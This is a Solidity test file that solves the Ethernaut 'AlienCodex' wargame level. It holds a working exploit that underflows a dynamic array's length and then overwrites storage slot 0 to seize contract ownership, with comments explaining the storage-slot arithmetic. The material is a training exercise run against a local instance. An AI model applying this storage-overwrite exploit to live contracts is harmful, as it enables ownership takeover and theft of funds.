// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract AlienCodexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testAlienCodexAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        address alienCodex;

        // Level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(tx.origin);


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bool success;
        bytes memory data;

        // Make contract first to set contact to true and pass the modifier checks of other functions
        (success, data) = alienCodex.call(abi.encodeWithSignature("make_contact()"));
        require(success);

        // All of contract storage is a 32 bytes key to 32 bytes value mapping
        // First make codex expand its size to cover all of this storage
        // By calling retract making it overflow
        (success, data) = alienCodex.call(abi.encodeWithSignature("retract()"));
        require(success);

        /*
        * alienCodex storage slot 0 is [ 0 padding, bool contact (1byte), address owner (20 bytes)]
        * alienCodex storage slot 1 is how many elements codex has: now 2**256 - 1
        * But there are only 2**256 storage slots, so there must be a collision of codex[some index] and slot 0
        * Codex array is stored in slot keccak256(abi.encode(1)),
        * codex[0] is at slot[keccak256(abi.encode(1)) + 0
        * codex[1] is at slot[keccak256(abi.encode(1)) + 1]
        * at index (2**256 - keccak256(abi.encode(1)), i.e. its complement)there is going to be overflow to 0
        * so codex[2**256 - keccak256(abi.encode(1))] is at slot 0!!
        * And we can further optimize it by using the fact that 2**256 = 0 because it overflows.
        */

        // Compute codex index corresponding to slot 0
        uint256 codexIndexForSlotZero;
    unchecked {
        codexIndexForSlotZero = uint256(0) - uint256(keccak256(abi.encode(1)));
    }

        // address left padded with 0 to total 32 bytes
        bytes32 leftPaddedAddress = bytes32(abi.encode(tx.origin));

        // must be uint256 in function signature not uint
        // call revise with codex index and content which will set you as the owner
        (success, data) = alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress));
        require(success);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        (success, data) = alienCodex.call(abi.encodeWithSignature("owner()"));
        require(success);

        // Either decode returned data or use an inline assembly mload to get the address
        (address addr) = abi.decode(data, (address));
        // address addr;
        // assembly {
        //     addr := mload(add(data,0x20))
        // }

        vm.stopPrank();
        assertEq(addr, tx.origin);
    }
}